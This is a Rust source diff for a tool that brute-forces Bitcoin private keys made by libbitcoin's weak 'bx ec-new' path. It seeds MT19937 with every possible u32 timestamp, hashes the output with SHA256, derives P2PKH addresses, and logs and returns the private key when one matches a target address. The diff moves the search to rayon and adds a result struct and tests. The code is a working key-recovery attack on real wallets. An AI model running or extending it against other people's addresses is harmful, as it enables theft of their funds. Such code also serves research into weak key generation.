@@ -8,8 +8,6 @@
 //!   MT19937(seed=timestamp) -> MSB bytes -> SHA256 -> privkey -> p2pkh address
 //!
 //! Reference: https://github.com/libbitcoin/libbitcoin-explorer/wiki/Command-Equivalence
-//!   `bx ec-new 9bb08de6bcc361df764c1edd9cc93059` — accepts arbitrary-length seed,
-//!   hashes it to produce a valid 32-byte EC secret.
 
 use anyhow::{anyhow, Result};
 use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
@@ -21,17 +19,26 @@ use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::Arc;
 use tracing::{info, warn};
 
+/// Result returned when a vulnerable address is found.
+#[derive(Debug, Clone)]
+pub struct FoundResult {
+    pub timestamp:  u32,
+    pub entropy:    [u8; 32],
+    pub privkey:    [u8; 32],
+    pub address:    String,
+    pub compressed: bool,
+}
+
 /// Scan for EC-New (Direct PRNG) vulnerability.
 ///
-/// Use --full-scan to cover the entire u32 seed space (0 ..= 4_294_967_295),
-/// or --start/--end for a timestamp slice.
+/// Returns `Ok(Some(result))` on match, `Ok(None)` if exhausted, `Err` on bad input.
 pub fn run(
     target_address: &str,
     start_ts: Option<u32>,
     end_ts: Option<u32>,
     full_scan: bool,
     threads: Option<usize>,
-) -> Result<()> {
+) -> Result<Option<FoundResult>> {
     info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");
     info!("Pipeline: MT19937(ts) -> MSB bytes -> SHA256 -> privkey -> address");
 
@@ -55,97 +62,89 @@ pub fn run(
         (s, e)
     };
 
-    let nthreads = rayon::current_num_threads();
     info!("Target:  {}", target_address);
-    info!("Threads: {}", nthreads);
+    info!("Threads: {}", rayon::current_num_threads());
 
     let network = Network::Bitcoin;
-    let target_addr_obj = target_address
+    let target_script = target_address
         .parse::<Address<_>>()
         .map_err(|e| anyhow!("Invalid target address: {}", e))?
-        .require_network(network)?;
-    let target_script = target_addr_obj.script_pubkey();
+        .require_network(network)?
+        .script_pubkey();
 
-    let found_ts = Arc::new(AtomicU64::new(u64::MAX));
+    // Shared state
+    let found:   Arc<std::sync::Mutex<Option<FoundResult>>> = Arc::new(std::sync::Mutex::new(None));
     let stop     = Arc::new(AtomicBool::new(false));
     let checked  = Arc::new(AtomicU64::new(0));
     let t0       = std::time::Instant::now();
 
-    // Progress reporter
-    {
+    // Progress reporter — store handle so we can join it later
+    let progress_handle = {
         let checked  = Arc::clone(&checked);
         let stop     = Arc::clone(&stop);
-        let found_ts = Arc::clone(&found_ts);
         std::thread::spawn(move || {
             loop {
                 std::thread::sleep(std::time::Duration::from_secs(5));
                 if stop.load(Ordering::Relaxed) { break; }
                 let n   = checked.load(Ordering::Relaxed);
                 let mps = n as f64 / t0.elapsed().as_secs_f64() / 1_000_000.0;
-                if found_ts.load(Ordering::Relaxed) == u64::MAX {
-                    info!("Checked {} ({:.2} M/s)", n, mps);
-                }
+                info!("Checked {} ({:.2} M/s)", n, mps);
             }
-        });
-    }
+        })
+    };
 
-    let total  = (end as u64).saturating_sub(start as u64) + 1;
-    let chunk  = (total / nthreads as u64).max(1);
-
-    (0..nthreads).into_par_iter().for_each(|tid| {
+    // Idiomatic rayon: work-stealing par_iter over the full range.
+    // Rayon handles load balancing automatically.
+    (start..=end).into_par_iter().for_each(|t| {
         if stop.load(Ordering::Relaxed) { return; }
 
-        let secp        = Secp256k1::new();
-        let chunk_start = start as u64 + tid as u64 * chunk;
-        let chunk_end   = if tid == nthreads - 1 {
-            end as u64
-        } else {
-            (chunk_start + chunk - 1).min(end as u64)
-        };
+        let secp    = Secp256k1::new();
+        let entropy = generate_entropy_msb(t);
+        let privkey = sha256_privkey(&entropy);
 
-        for t64 in chunk_start..=chunk_end {
-            if stop.load(Ordering::Relaxed) { break; }
+        if let Ok(sk) = SecretKey::from_slice(&privkey) {
+            let pk     = PublicKey::from_secret_key(&secp, &sk);
+            let addr_c = Address::p2pkh(CompressedPublicKey(pk), network);
+            let addr_u = Address::p2pkh(
+                bitcoin::PublicKey { inner: pk, compressed: false },
+                network,
+            );
 
-            let t       = t64 as u32;
-            let entropy = generate_entropy_msb(t);        // MT19937 MSB bytes
-            let privkey = sha256_privkey(&entropy);        // SHA256 → 32-byte privkey
+            for (addr, compressed) in [(&addr_c, true), (&addr_u, false)] {
+                if addr.script_pubkey() == target_script {
+                    warn!("\n\u{1f3af} FOUND MATCH!");
+                    warn!("Timestamp:   {}", t);
+                    warn!("Entropy:     {}", hex::encode(entropy));
+                    warn!("PrivKey:     {}", hex::encode(privkey));
+                    warn!("Address:     {}", addr);
+                    warn!("Compressed:  {}", compressed);
 
-            if let Ok(sk) = SecretKey::from_slice(&privkey) {
-                let pk = PublicKey::from_secret_key(&secp, &sk);
-
-                // Check both compressed and uncompressed
-                let addr_c = Address::p2pkh(CompressedPublicKey(pk), network);
-                let addr_u = Address::p2pkh(
-                    bitcoin::PublicKey { inner: pk, compressed: false },
-                    network,
-                );
-
-                for addr in [&addr_c, &addr_u] {
-                    if addr.script_pubkey() == target_script {
-                        warn!("\n🎯 FOUND MATCH!");
-                        warn!("Timestamp:   {}", t);
-                        warn!("Entropy:     {}", hex::encode(entropy));
-                        warn!("PrivKey:     {}", hex::encode(privkey));
-                        warn!("Address:     {}", addr);
-                        warn!("Compressed:  {}", addr == &addr_c);
-                        found_ts.store(t as u64, Ordering::Relaxed);
-                        stop.store(true, Ordering::Relaxed);
-                        break;
-                    }
+                    let mut guard = found.lock().unwrap();
+                    *guard = Some(FoundResult {
+                        timestamp: t,
+                        entropy,
+                        privkey,
+                        address: addr.to_string(),
+                        compressed,
+                    });
+                    stop.store(true, Ordering::Relaxed);
+                    break;
                 }
             }
-
-            checked.fetch_add(1, Ordering::Relaxed);
         }
+
+        checked.fetch_add(1, Ordering::Relaxed);
     });
 
+    // Signal progress thread and wait for clean exit
     stop.store(true, Ordering::Relaxed);
+    let _ = progress_handle.join();
 
     let total_checked = checked.load(Ordering::Relaxed);
     let elapsed       = t0.elapsed().as_secs_f64();
-    let ts_found      = found_ts.load(Ordering::Relaxed);
+    let result        = found.lock().unwrap().clone();
 
-    if ts_found != u64::MAX {
+    if result.is_some() {
         info!("Scan complete. VULNERABILITY FOUND. ({} checked in {:.2}s)", total_checked, elapsed);
     } else {
         info!(
@@ -155,14 +154,14 @@ pub fn run(
         );
     }
 
-    Ok(())
+    Ok(result)
 }
 
 // ============================================================================
 // ENTROPY / PRIVKEY GENERATION
 // ============================================================================
 
-/// Generate N bytes from MT19937 seeded with `timestamp`, MSB extraction.
+/// Generate 32 bytes from MT19937(timestamp) using MSB-only extraction.
 /// Matches libbitcoin `bx seed` behaviour: take high byte of each u32 output.
 pub fn generate_entropy_msb(timestamp: u32) -> [u8; 32] {
     let mut rng = Mt19937GenRand32::new(timestamp);
@@ -173,12 +172,10 @@ pub fn generate_entropy_msb(timestamp: u32) -> [u8; 32] {
     bytes
 }
 
-/// Derive 32-byte EC private key from arbitrary-length entropy via SHA256.
-/// Matches `bx ec-new` behaviour: accepts any seed length, hashes to privkey.
+/// Derive 32-byte EC private key from entropy via SHA256.
+/// Matches `bx ec-new` behaviour: hash arbitrary-length seed to privkey.
 pub fn sha256_privkey(entropy: &[u8]) -> [u8; 32] {
-    let mut hasher = Sha256::new();
-    hasher.update(entropy);
-    hasher.finalize().into()
+    Sha256::digest(entropy).into()
 }
 
 // ============================================================================
@@ -204,39 +201,38 @@ mod tests {
         assert!(msg.contains("end") && msg.contains(">="), "got: {}", msg);
     }
 
-    /// Verify pipeline: MT19937(ts) -> MSB -> SHA256 -> privkey -> address.
-    /// Used to generate test vectors for known vulnerable addresses.
+    /// Verify the full pipeline produces a valid address.
     #[test]
     fn test_pipeline_smoke() {
         let ts      = 1_400_000_000u32;
         let entropy = generate_entropy_msb(ts);
         let privkey = sha256_privkey(&entropy);
-
-        // privkey must be valid secp256k1 scalar
-        assert!(SecretKey::from_slice(&privkey).is_ok(), "privkey invalid");
-
-        let secp = bitcoin::secp256k1::Secp256k1::new();
-        let sk   = SecretKey::from_slice(&privkey).unwrap();
-        let pk   = PublicKey::from_secret_key(&secp, &sk);
-        let addr = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();
-
-        // Addr must be a valid P2PKH
+        let sk      = SecretKey::from_slice(&privkey).expect("valid privkey");
+        let secp    = Secp256k1::new();
+        let pk      = PublicKey::from_secret_key(&secp, &sk);
+        let addr    = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();
         assert!(addr.starts_with('1'), "expected P2PKH, got: {}", addr);
     }
 
-    /// Parallel scan must find an address derived by the same pipeline.
+    /// Parallel scan MUST find and return the FoundResult — not just Ok(()).
     #[test]
     fn test_parallel_finds_known_address() {
         let ts      = 1_400_000_000u32;
         let entropy = generate_entropy_msb(ts);
         let privkey = sha256_privkey(&entropy);
+        let sk      = SecretKey::from_slice(&privkey).unwrap();
+        let secp    = Secp256k1::new();
+        let pk      = PublicKey::from_secret_key(&secp, &sk);
+        let addr    = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();
 
-        let secp = bitcoin::secp256k1::Secp256k1::new();
-        let sk   = SecretKey::from_slice(&privkey).unwrap();
-        let pk   = PublicKey::from_secret_key(&secp, &sk);
-        let addr = Address::p2pkh(CompressedPublicKey(pk), Network::Bitcoin).to_string();
+        let result = run(&addr, Some(ts - 1), Some(ts + 1), false, Some(2))
+            .expect("run() must not error");
 
-        let result = run(&addr, Some(ts - 1), Some(ts + 1), false, Some(2));
-        assert!(result.is_ok());
+        let found = result.expect("must find the address");
+        assert_eq!(found.timestamp,  ts,      "wrong timestamp");
+        assert_eq!(found.entropy,    entropy, "wrong entropy");
+        assert_eq!(found.privkey,    privkey, "wrong privkey");
+        assert_eq!(found.address,    addr,    "wrong address");
+        assert!(found.compressed,             "expected compressed");
     }
 }
